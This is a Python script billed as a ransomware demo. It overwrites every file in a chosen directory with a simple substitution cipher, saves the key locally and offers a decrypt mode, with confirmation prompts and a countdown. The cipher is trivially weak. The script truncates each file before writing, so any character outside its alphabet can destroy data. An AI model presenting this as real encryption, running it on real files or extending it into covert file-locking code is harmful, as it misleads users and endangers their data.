"""
NOTE: NOT ACTUAL MALWARE
JUST A DEMO TO SHOW HOW EASY IT IS
"""

from string import printable
from time import sleep
import os
import random

def generate_key(filename: str) -> list:
    # Random Key
    ran = random.Random()

    # Stores the key in a list
    begin_index: int = ran.randint(0, len(printable) - 1)
    gen_key: list = [printable[x] for x in range(begin_index, len(printable))]
    for x in range(begin_index - 1, -1, -1):
        gen_key.append(printable[x])
    
    # Writes the key to a file
    with open(filename, "w") as file:
        for char in gen_key:
            file.write(char)
    
    # Returns key to be used
    return gen_key

def list_files(directory: str, key_file: str) -> list:
    user_sys(sys_clear_keyword)
    files: list = []

    for item in os.listdir(directory):
        if item == "main.py" or item == key_file or item == "detected.txt":
            continue
        if os.path.isfile(f"{directory}/{item}"):
            files.append(item)

    with open("detected.txt", "w") as write_file:
        write_file.write(f"Files detected in directory \"{directory}\":\n")
        for file in files:
            write_file.write(f"  {files.index(file) + 1}. {file}\n")
    print("Detected files written at detected.txt")
    sleep(3)
    return files

def encrypt(files: list, encrypt_key: list, directory: str):
    for file in files:
        # Retrieves the contents of the file
        data: list = []
        with open(f"{directory}/{file}", "r") as read_file:
            data = read_file.readlines()
        
        # Encrypts the contents with the key
        with open(f"{directory}/{file}", "w") as write_file:
            for line in data:
                for char in line:
                    write_file.write(encrypt_key[printable.index(char)])

def decrypt(files: list, decrypt_key: list, directory: str):
    for file in files:
        # Retrieves the contents of the file
        data: list = []
        with open(f"{directory}/{file}", "r") as read_file:
            data = read_file.readlines()
        
        # Decrypts the contents with the key
        with open(f"{directory}/{file}", "w") as write_file:
            for line in data:
                for char in line:
                    write_file.write(printable[decrypt_key.index(char)])

# Setup
user_sys = os.system
sys_clear_keyword = "cls"
user_sys(sys_clear_keyword)

# Prompt
choice: int = int(input("Encrypt (0) or Decrypt (1): "))
user_sys(sys_clear_keyword)

if choice:
    user_key_file: str = input("Name of Key File: ")
    user_dir_decrypt: str = input("Directory Name: ")

    if not user_key_file.endswith(".txt"):
        user_key_file += ".txt"
    if user_dir_decrypt == "":
        user_dir_decrypt = "./"

    user_key: list = []
    with open(user_key_file, "r") as read_file:
        lines = read_file.readlines()
        for line in lines:
            for char in line:
                user_key.append(char)
    
    files = list_files(user_dir_decrypt, user_key_file)

    decrypt(files, user_key, user_dir_decrypt)
    user_sys(sys_clear_keyword)
    print("Files Decrypted!")
else:
    # User information
    user_dir: str = input("Directory Name: ")
    user_file: str = input("Name of Key File: ")

    if not user_file.endswith(".txt"):
        user_file += ".txt"
    if user_dir == "":
        user_dir = "./"

    # Generates and Writes key
    user_key = generate_key(user_file);
    files = list_files(user_dir, user_file)
    user_sys(sys_clear_keyword)
    for x in range(5):
        print(f"Key saved at {user_file}")
        sleep(0.5)
        user_sys(sys_clear_keyword)
        sleep(0.5)

    # For safety reasons
    sure: int = int(input(f"All files in \"{user_dir}\" will now be encrypted!\nIf the key is lost, the data cannot be recovered!\nDo you wish to continue? (0/1): "))
    user_sys(sys_clear_keyword)

    # Encrypts
    if sure:
        for x in range(5):
            print(f"WARNING: ENCRYPTION BEGINNING IN {5 - x}!\nPRESS CTRL + C TO INTERRUPT PROGRAM!")
            sleep(0.5)
            user_sys(sys_clear_keyword)
            sleep(0.5)
        encrypt(files, user_key, user_dir)
        print("Files Encrypted!")
    else:
        print("Files Not Encrypted!")
